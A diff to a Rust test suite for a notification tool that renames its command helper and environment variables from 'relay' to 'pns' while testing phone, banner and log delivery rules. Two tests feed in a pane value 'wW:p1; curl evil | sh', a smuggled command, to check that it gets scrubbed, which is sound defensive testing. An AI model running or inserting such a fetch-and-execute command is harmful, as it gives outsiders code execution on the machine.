@@ -20,7 +20,7 @@ fn away_from_the_desk_cards_the_phone_and_logs_but_raises_no_banner() {
     // was the old always-on rule this replaced.
     let sandbox = Sandbox::new("alert-path");
     run(sandbox
-        .relay()
+        .pns()
         .args(["--agent", "claude", "--state", "done"])
         .args(["--project", "dotfiles", "--detail", "a summary"]));
     assert!(sandbox.fired("moshi"));
@@ -33,8 +33,8 @@ fn at_the_desk_with_the_pane_out_of_sight_the_banner_is_the_whole_delivery() {
     // Matrix row "desk, origin hidden: banner". No card, because the operator
     // is right here.
     let sandbox = Sandbox::new("desk-hidden");
-    let mut command = sandbox.relay();
-    command.env("RELAY_IDLE_SECS", "0");
+    let mut command = sandbox.pns();
+    command.env("PNS_IDLE_SECS", "0");
     sandbox.stub_herdr(&mut command, false);
     run(command
         .args(["--agent", "claude", "--state", "done", "--detail", "x"])
@@ -49,8 +49,8 @@ fn at_the_desk_watching_the_pane_only_the_log_fires() {
     // Matrix row "desk watching: suppressed entirely". The pane is on screen,
     // so the event is already in front of the operator.
     let sandbox = Sandbox::new("desk-watching");
-    let mut command = sandbox.relay();
-    command.env("RELAY_IDLE_SECS", "0");
+    let mut command = sandbox.pns();
+    command.env("PNS_IDLE_SECS", "0");
     sandbox.stub_herdr(&mut command, true);
     run(command
         .args(["--agent", "claude", "--state", "done", "--detail", "x"])
@@ -68,7 +68,7 @@ fn the_alert_path_labels_the_hermes_leg_silent_on_the_wire() {
     // selects is whether the leg reports its outcome.
     let sandbox = Sandbox::new("hermes-async");
     run(sandbox
-        .relay()
+        .pns()
         .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
     assert_eq!(sandbox.event("hermes")["mode"], "async");
 }
@@ -77,7 +77,7 @@ fn the_alert_path_labels_the_hermes_leg_silent_on_the_wire() {
 fn a_channel_is_handed_the_rendered_event_not_the_raw_arguments() {
     let sandbox = Sandbox::new("rendered-event");
     run(sandbox
-        .relay()
+        .pns()
         .args(["--agent", "claude", "--state", "done"])
         .args(["--project", "dotfiles", "--branch", "main"])
         .args(["--detail", "a summary"]));
@@ -101,8 +101,8 @@ fn a_channel_is_handed_the_rendered_event_not_the_raw_arguments() {
 fn local_only_keeps_the_banner_and_reaches_nothing_off_the_machine() {
     let sandbox = Sandbox::new("local-only");
     run(sandbox
-        .relay()
-        .env("RELAY_IDLE_SECS", "0")
+        .pns()
+        .env("PNS_IDLE_SECS", "0")
         .args(["--agent", "claude", "--state", "done", "--detail", "x"])
         .arg("--local-only"));
     assert!(sandbox.fired("macos-banner"));
@@ -114,7 +114,7 @@ fn local_only_keeps_the_banner_and_reaches_nothing_off_the_machine() {
 fn remote_only_delivers_through_hermes_alone() {
     let sandbox = Sandbox::new("remote-only");
     run(sandbox
-        .relay()
+        .pns()
         .args(["--agent", "weekly", "--state", "done"])
         .args(["--project", "skills", "--detail", "ran", "--remote-only"]));
     assert!(sandbox.fired("hermes"));
@@ -126,7 +126,7 @@ fn remote_only_delivers_through_hermes_alone() {
 fn hermes_is_sync_on_the_log_path_which_is_what_makes_an_undelivered_entry_visible() {
     let sandbox = Sandbox::new("hermes-sync");
     run(sandbox
-        .relay()
+        .pns()
         .args(["--agent", "weekly", "--state", "done", "--detail", "ran"])
         .arg("--remote-only"));
     assert_eq!(sandbox.event("hermes")["mode"], "sync");
@@ -136,7 +136,7 @@ fn hermes_is_sync_on_the_log_path_which_is_what_makes_an_undelivered_entry_visib
 fn both_narrowing_flags_together_deliver_nothing_and_say_so() {
     let sandbox = Sandbox::new("both-flags");
     let output = run(sandbox
-        .relay()
+        .pns()
         .args(["--agent", "x", "--state", "done", "--detail", "y"])
         .args(["--local-only", "--remote-only"]));
     assert!(!sandbox.fired("moshi"));
@@ -151,8 +151,8 @@ fn both_narrowing_flags_together_deliver_nothing_and_say_so() {
 fn at_the_desk_the_phone_is_skipped_and_only_the_phone() {
     let sandbox = Sandbox::new("at-the-desk");
     run(sandbox
-        .relay()
-        .env("RELAY_IDLE_SECS", "0")
+        .pns()
+        .env("PNS_IDLE_SECS", "0")
         .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
     assert!(!sandbox.fired("moshi"));
     assert!(sandbox.fired("hermes"));
@@ -166,9 +166,9 @@ fn relay_skip_phone_drops_the_phone_and_only_the_phone() {
     // banner and the paper trail are still wanted.
     let sandbox = Sandbox::new("skip-phone");
     run(sandbox
-        .relay()
-        .env("RELAY_IDLE_SECS", "0")
-        .env("RELAY_SKIP_PHONE", "1")
+        .pns()
+        .env("PNS_IDLE_SECS", "0")
+        .env("PNS_SKIP_PHONE", "1")
         .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
     assert!(!sandbox.fired("moshi"));
     assert!(sandbox.fired("hermes"));
@@ -181,10 +181,10 @@ fn relay_skip_phone_beats_relay_force_phone() {
     // the override is the one thing that could reintroduce the double push.
     let sandbox = Sandbox::new("skip-beats-force");
     run(sandbox
-        .relay()
-        .env("RELAY_IDLE_SECS", "0")
-        .env("RELAY_SKIP_PHONE", "1")
-        .env("RELAY_FORCE_PHONE", "1")
+        .pns()
+        .env("PNS_IDLE_SECS", "0")
+        .env("PNS_SKIP_PHONE", "1")
+        .env("PNS_FORCE_PHONE", "1")
         .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
     assert!(!sandbox.fired("moshi"));
 }
@@ -193,9 +193,9 @@ fn relay_skip_phone_beats_relay_force_phone() {
 fn relay_force_phone_overrides_presence() {
     let sandbox = Sandbox::new("force-phone");
     run(sandbox
-        .relay()
-        .env("RELAY_IDLE_SECS", "0")
-        .env("RELAY_FORCE_PHONE", "1")
+        .pns()
+        .env("PNS_IDLE_SECS", "0")
+        .env("PNS_FORCE_PHONE", "1")
         .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
     assert!(sandbox.fired("moshi"));
 }
@@ -207,8 +207,8 @@ fn a_channel_that_fails_neither_fails_the_caller_nor_suppresses_its_siblings() {
     let sandbox = Sandbox::new("channel-fails");
     sandbox.stub_channel("moshi", "exit 9");
     run(sandbox
-        .relay()
-        .env("RELAY_IDLE_SECS", "0")
+        .pns()
+        .env("PNS_IDLE_SECS", "0")
         .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
     assert!(sandbox.fired("hermes"));
     assert!(sandbox.fired("macos-banner"));
@@ -219,8 +219,8 @@ fn an_absent_channel_is_simply_not_installed() {
     let sandbox = Sandbox::new("absent-channel");
     std::fs::remove_file(sandbox.root.join("channels/hermes.sh")).expect("remove the channel");
     run(sandbox
-        .relay()
-        .env("RELAY_IDLE_SECS", "0")
+        .pns()
+        .env("PNS_IDLE_SECS", "0")
         .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
     assert!(sandbox.fired("macos-banner"));
 }
@@ -235,8 +235,8 @@ fn a_back_tap_newer_than_the_last_desk_input_moves_the_operator_to_mobile() {
     let marker = sandbox.path("phone.marker");
     std::fs::write(&marker, "").expect("marker");
     run(sandbox
-        .relay()
-        .env("RELAY_IDLE_SECS", "300")
+        .pns()
+        .env("PNS_IDLE_SECS", "300")
         .env("PNS_PHONE_MARKER_FILE", &marker)
         .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
     assert!(sandbox.fired("moshi"));
@@ -250,9 +250,9 @@ fn desk_input_after_the_tap_cancels_it() {
     let sandbox = Sandbox::new("tap-cancelled");
     let marker = sandbox.path("phone.marker");
     std::fs::write(&marker, "").expect("marker");
-    let mut command = sandbox.relay();
+    let mut command = sandbox.pns();
     command
-        .env("RELAY_IDLE_SECS", "0")
+        .env("PNS_IDLE_SECS", "0")
         .env("PNS_PHONE_MARKER_FILE", &marker);
     sandbox.stub_herdr(&mut command, false);
     run(command
@@ -267,14 +267,14 @@ fn a_tap_with_moshi_closed_cards_the_phone_even_with_the_pane_in_plain_sight() {
     // Drill D6, run (i), 2026-08-19: Back Tap with moshi closed produced
     // NOTHING. The tap moved the surface to mobile, the origin pane sat
     // focused on the desk display nobody was at, and mobile-plus-visible
-    // suppressed. `relay()` states the phone's pty clock as a day untouched,
+    // suppressed. `pns()` states the phone's pty clock as a day untouched,
     // which is exactly the closed-moshi half of the repro.
     let sandbox = Sandbox::new("tap-moshi-closed");
     let marker = sandbox.path("phone.marker");
     std::fs::write(&marker, "").expect("marker");
-    let mut command = sandbox.relay();
+    let mut command = sandbox.pns();
     command
-        .env("RELAY_IDLE_SECS", "300")
+        .env("PNS_IDLE_SECS", "300")
         .env("PNS_PHONE_MARKER_FILE", &marker);
     sandbox.stub_herdr(&mut command, true);
     run(command
@@ -290,8 +290,8 @@ fn a_narrowing_flag_still_beats_a_fresh_tap() {
     let marker = sandbox.path("phone.marker");
     std::fs::write(&marker, "").expect("marker");
     run(sandbox
-        .relay()
-        .env("RELAY_IDLE_SECS", "300")
+        .pns()
+        .env("PNS_IDLE_SECS", "300")
         .env("PNS_PHONE_MARKER_FILE", &marker)
         .arg("--local-only")
         .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
@@ -304,10 +304,10 @@ fn skip_phone_still_beats_a_fresh_tap() {
     let marker = sandbox.path("phone.marker");
     std::fs::write(&marker, "").expect("marker");
     run(sandbox
-        .relay()
-        .env("RELAY_IDLE_SECS", "300")
+        .pns()
+        .env("PNS_IDLE_SECS", "300")
         .env("PNS_PHONE_MARKER_FILE", &marker)
-        .env("RELAY_SKIP_PHONE", "1")
+        .env("PNS_SKIP_PHONE", "1")
         .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
     assert!(!sandbox.fired("moshi"));
 }
@@ -319,8 +319,8 @@ fn a_phone_in_hand_watching_the_pane_gets_nothing_but_the_log() {
     // Matrix row "mobile watching: suppressed". The card would describe the
     // pane already filling the phone's screen.
     let sandbox = Sandbox::new("watched-pane");
-    let mut command = sandbox.relay();
-    command.env("RELAY_PHONE_INPUT_AGE", "0");
+    let mut command = sandbox.pns();
+    command.env("PNS_PHONE_INPUT_AGE", "0");
     sandbox.stub_herdr(&mut command, true);
     run(command
         .args(["--agent", "claude", "--state", "done", "--detail", "x"])
@@ -334,8 +334,8 @@ fn a_phone_in_hand_watching_the_pane_gets_nothing_but_the_log() {
 fn a_phone_in_hand_showing_another_tab_still_cards() {
     // Matrix row "mobile, origin hidden: card only".
     let sandbox = Sandbox::new("other-pane");
-    let mut command = sandbox.relay();
-    command.env("RELAY_PHONE_INPUT_AGE", "0");
+    let mut command = sandbox.pns();
+    command.env("PNS_PHONE_INPUT_AGE", "0");
     sandbox.stub_herdr(&mut command, false);
     run(command
         .args(["--agent", "claude", "--state", "done", "--detail", "x"])
@@ -350,8 +350,8 @@ fn an_unreadable_view_delivers_rather_than_suppressing_on_doubt() {
     // doubt". No herdr on PATH at all, which is the probe failing.
     let sandbox = Sandbox::new("unknown-view");
     run(sandbox
-        .relay()
-        .env("RELAY_IDLE_SECS", "0")
+        .pns()
+        .env("PNS_IDLE_SECS", "0")
         .args(["--agent", "claude", "--state", "done", "--detail", "x"])
         .args(["--pane", "t1:p2"]));
     assert!(sandbox.fired("macos-banner"));
@@ -360,10 +360,10 @@ fn an_unreadable_view_delivers_rather_than_suppressing_on_doubt() {
 #[test]
 fn force_phone_is_caller_intent_and_beats_the_whole_surface_model() {
     let sandbox = Sandbox::new("force-phone-watched");
-    let mut command = sandbox.relay();
+    let mut command = sandbox.pns();
     command
-        .env("RELAY_IDLE_SECS", "0")
-        .env("RELAY_FORCE_PHONE", "1");
+        .env("PNS_IDLE_SECS", "0")
+        .env("PNS_FORCE_PHONE", "1");
     sandbox.stub_herdr(&mut command, true);
     run(command
         .args(["--agent", "claude", "--state", "done", "--detail", "x"])
@@ -375,8 +375,8 @@ fn force_phone_is_caller_intent_and_beats_the_whole_surface_model() {
 fn a_pane_with_shell_metacharacters_is_scrubbed_from_every_delivered_event() {
     let sandbox = Sandbox::new("pane-scrub");
     let output = run(sandbox
-        .relay()
-        .env("RELAY_IDLE_SECS", "0")
+        .pns()
+        .env("PNS_IDLE_SECS", "0")
         .args(["--agent", "claude", "--state", "done", "--detail", "x"])
         .args(["--pane", "wW:p1; curl evil | sh"]));
     assert!(sandbox.fired("macos-banner"));
@@ -391,7 +391,7 @@ fn a_pane_with_shell_metacharacters_is_scrubbed_from_every_delivered_event() {
 fn a_scrub_warning_is_not_printed_when_no_channel_will_run() {
     let sandbox = Sandbox::new("scrub-silent");
     let output = run(sandbox
-        .relay()
+        .pns()
         .args(["--agent", "claude", "--state", "done"])
         .args(["--pane", "wW:p1; curl evil | sh"])
         .args(["--local-only", "--remote-only"]));
@@ -404,7 +404,7 @@ fn a_non_unicode_argument_never_breaks_the_exit_zero_edge() {
     // degrade like any unknown token, not abort the notification.
     let sandbox = Sandbox::new("non-unicode");
     let output = run(sandbox
-        .relay()
+        .pns()
         .arg(OsStr::from_bytes(&[0xff]))
         .args(["--local-only", "--remote-only"]));
     assert!(stdout(&output).contains("SKIPPED"), "{output:?}");
@@ -421,7 +421,7 @@ fn the_delivered_event_is_newline_terminated_for_line_oriented_channels() {
         ),
     );
     run(sandbox
-        .relay()
+        .pns()
         .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
     let line = std::fs::read_to_string(sandbox.path("line.event")).expect("one whole line");
     let parsed: serde_json::Value = serde_json::from_str(&line).expect("a whole JSON line");
@@ -441,8 +441,8 @@ fn a_watch_card_toggle_of_the_wrong_type_is_refused_out_loud() {
          [plugins.hermes]\nenabled = true\n",
     )
     .expect("config");
-    let mut command = sandbox.relay();
-    command.env("RELAY_PHONE_INPUT_AGE", "0");
+    let mut command = sandbox.pns();
+    command.env("PNS_PHONE_INPUT_AGE", "0");
     sandbox.stub_herdr(&mut command, true);
     let output = run(command
         .args(["--agent", "claude", "--state", "done", "--detail", "x"])
@@ -530,11 +530,11 @@ fn a_plan_with_no_native_leg_never_opens_the_auth_file() {
             .success()
     );
     let child = sandbox
-        .relay()
+        .pns()
         // The phone's age is stated so this test measures the auth read
         // alone, not the live process walk underneath it.
-        .env("RELAY_PHONE_INPUT_AGE", "99999")
-        .env("RELAY_AUTH_FILE", &fifo)
+        .env("PNS_PHONE_INPUT_AGE", "99999")
+        .env("PNS_AUTH_FILE", &fifo)
         .args(["--agent", "claude", "--state", "done", "--detail", "x"])
         .spawn()
         .expect("the engine starts");
